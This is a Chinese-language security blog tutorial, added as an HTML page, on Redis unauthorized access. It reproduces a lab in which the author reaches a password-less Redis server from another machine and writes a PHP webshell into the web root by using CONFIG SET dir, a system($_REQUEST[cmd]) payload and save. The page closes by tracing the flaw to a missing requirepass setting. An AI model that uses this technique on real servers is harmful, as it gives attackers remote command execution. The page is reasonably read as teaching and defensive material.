@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang=""><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <title>Redis未授权访问简介</title>
+    <meta name="description" content="倾旋的博客">
+    <meta name="author" content='倾旋'>
+
+    <link href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous">
+
+    
+    <link rel="stylesheet" href="/sass/researcher.min.css">
+
+    
+        <link rel="icon" type="image/ico" href="https://payloads.online/favicon.ico">
+    
+
+    
+        
+    
+</head>
+
+    <body><div class="container mt-5">
+    <nav class="navbar navbar-expand-sm flex-column flex-sm-row text-nowrap p-0">
+        <a class="navbar-brand mx-0 mr-sm-auto" style="color: #dc3545;" href="https://payloads.online" title="倾旋的博客">
+          
+          倾旋的博客
+        </a>
+        <div class="navbar-nav flex-row flex-wrap justify-content-center">
+            
+                
+                
+                    <a class="nav-item nav-link" href="/about" title="About">
+                        About
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/links/" title="Links">
+                        Links
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/post/" title="Posts">
+                        Posts
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/index.xml" title="Rss">
+                        Rss
+                    </a>
+                    
+                
+            
+        </div>
+    </nav>
+</div>
+<hr>
+<div id="content">
+<div class="container">
+    <p>本文介绍一下Redis未授权访问简介</p>
+<blockquote>
+<p>Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。从2010年3月15日起，Redis的开发工作由VMware主持。从2013年5月开始，Redis的开发由Pivotal赞助。</p>
+</blockquote>
+<blockquote>
+<p>redis是一个key-value存储系统。和Memcached类似，它支持存储的value类型相对更多，包括string(字符串)、list(链表)、set(集合)、zset(sorted set –有序集合)和hash（哈希类型）。这些数据类型都支持push/pop、add/remove及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上，redis支持各种不同方式的排序。与memcached一样，为了保证效率，数据都是缓存在内存中。区别的是redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步。</p>
+</blockquote>
+<p>之前看SRC刷过Redis未授权访问的漏洞</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/3150364-323afe041674576d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="redis_0x1-2.png"></p>
+<p>那么下面我来揭开它的神秘面纱！</p>
+<p>首先我下载了安装包。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/3150364-3c97530c544d98e1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="redis_0x2.png"></p>
+<p>[ — 安装过程 自行百度 –]</p>
+<p>安装好以后，我们启动redis服务：</p>
+<pre><code>/usr/share/redis/bin/redis-server /etc/redis.conf
+vim /etc/redis.conf
+</code></pre><p>在181行左右 我先注释访问密码。</p>
+<p>然后启动redis-server</p>
+<pre><code>[root@localhost 桌面]# ps -A | grep redis
+ 3931 ?        00:00:00 redis-server
+</code></pre><p>首先我先用客户端连接服务器：</p>
+<pre><code>[root@localhost 桌面]# redis-cli 
+redis 127.0.0.1:6379&gt; keys *
+1) &quot;about&quot;
+2) &quot;user:id1&quot;
+3) &quot;user:id2&quot;
+4) &quot;admin&quot;
+5) &quot;str&quot;
+redis 127.0.0.1:6379&gt; get str
+&quot;ldjskjdsahdsaa&quot;
+redis 127.0.0.1:6379&gt; 
+</code></pre><p>可以看到能直接操作数据库。</p>
+<p>下面我用另外一台服务器做安全测试</p>
+<pre><code>[root@localhost 桌面]# redis-cli -h 10.10.3.215
+redis 10.10.3.215:6379&gt; keys *
+1) &quot;about&quot;
+2) &quot;user:id1&quot;
+3) &quot;user:id2&quot;
+4) &quot;admin&quot;
+5) &quot;str&quot;
+redis 10.10.3.215:6379&gt; 
+</code></pre><p>发现也是可以直接操作数据库</p>
+<p>根据redis语句我们写webshell….</p>
+<p>前提是知道绝对路径，当然也可以用语句判断。</p>
+<pre><code>redis 10.10.3.215:6379&gt; CONFIG SET dir /var/wwwroot/
+(error) ERR Changing directory: No such file or directory
+</code></pre><p>可以发现不存在，那么就可以猜解目录了。</p>
+<p>下面我演示写webshell</p>
+<pre><code>redis 10.10.3.215:6379&gt; CONFIG SET dir /usr/share/apache/htdocs/ #这里是站点绝对路径
+OK
+redis 10.10.3.215:6379&gt; set shell &quot;&lt;?php echo system($_REQUEST[cmd])?&gt;&quot;
+OK
+redis 10.10.3.215:6379&gt; CONFIG SET dbfilename shell.php
+OK
+redis 10.10.3.215:6379&gt; save  #将内存中的数据保存到dbfilename中
+OK
+redis 10.10.3.215:6379&gt; 
+</code></pre><p>这样就getshell了</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/3150364-78f6ce3f2a7e5357.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="redis_0x4.png"></p>
+<blockquote>
+<p>下面看看这个未授权原因
+在刚才的配置文件中，有一个选项
+设置客户端连接后进行任何其他指定前需要使用的密码。
+警告：因为redis速度相当快，所以在一台比较好的服务器下，一个外部的用户可以在一秒钟进行150K次的密码尝试，这意味着你需要指定非常非常强大的密码来防止暴力破解
+requirepass [密码]
+所以必须设置密码。
+出现这类漏洞就是 配置不得当导致控制系统 执行任意代码  再深入还可以威胁主从服务器 及其他的数据库服务器。</p>
+</blockquote>
+</div>
+
+        </div><div id="footer" class="mb-5">
+    <hr>
+    <div class="container text-center">
+        
+            <a href="https://twitter.com/Rvn0xsy" class="fab fa-twitter fa-1x" title="Twitter"></a>
+        
+            <a href="mailto:rvn0xsy@gmail.com" class="fas fa-envelope fa-1x" title="E-mail"></a>
+        
+    </div>
+    
+        <div class="container text-center">
+            <a href="https://payloads.online" title="- PAYLOADS.ONLINE -"><small>- PAYLOADS.ONLINE -</small></a>
+        </div>
+    
+</div>
+</body>
+</html>
